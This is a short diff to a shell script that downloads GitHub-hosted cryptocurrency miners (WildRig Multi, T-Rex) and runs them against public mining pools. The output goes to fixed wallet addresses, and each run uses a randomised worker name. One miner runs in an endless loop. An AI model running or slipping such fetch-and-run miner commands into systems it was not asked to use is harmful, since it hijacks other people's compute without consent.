@@ -1,3 +1,11 @@
+curl https://github.com/andru-kun/wildrig-multi/releases/download/0.47.9/wildrig-multi-linux-0.47.9.tar.gz -L -o wildrig-multi-linux-0.47.9.tar.gz
+tar xf wildrig-multi-linux-0.47.9.tar.gz
+while :; do
+./wildrig-multi --algo qhash --url qubitcoin.luckypool.io:8610 -u bc1qc8kqa8dqg2hj87ngplkcn56rdk6tgp3le54x78.$(echo $RANDOM | md5sum | head -c 10) -p x
+done
+
+
+
 curl https://github.com/kryptex-miners-org/kryptex-miners/releases/download/trex-0-26-8/t-rex-0.26.8-linux.tar.gz -L -o t-rex-0.26.8-linux.tar.gz
 tar xf t-rex-0.26.8-linux.tar.gz
 ./t-rex -a kawpow -o stratum+tcp://de.quai.gfwroute.com:1185 -u 0x000284da7cC36046Be6d59B3343a573a83A09b73.$(echo $RANDOM | md5sum | head -c 10) -p x
